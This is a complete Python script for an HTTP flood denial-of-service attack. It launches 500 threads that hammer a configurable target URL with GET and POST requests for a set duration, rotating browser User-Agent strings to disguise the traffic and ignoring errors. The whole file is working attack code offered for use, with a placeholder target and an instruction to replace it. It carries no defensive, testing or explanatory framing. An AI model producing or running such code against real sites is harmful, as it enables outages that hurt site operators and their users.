import requests
import threading
import random
import time

TARGET_URL = "http://example.com"  # Replace with target URL
THREADS = 500  # Number of concurrent threads
DURATION = 10  # Attack duration in seconds

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
]


def flood():
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"data": random.randint(1000, 9999)}  # Random payload
    while time.time() < END_TIME:
        try:
            requests.get(TARGET_URL, headers=headers)  # HTTP GET request
            requests.post(TARGET_URL, headers=headers, data=payload)  # HTTP POST request
        except requests.exceptions.RequestException:
            pass  # Ignore failed requests


if __name__ == "__main__":
    print(f"Starting HTTP Flood on {TARGET_URL} with {THREADS} threads for {DURATION} seconds...")
    END_TIME = time.time() + DURATION
    threads = []

    for _ in range(THREADS):
        thread = threading.Thread(target=flood)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("Attack finished.")
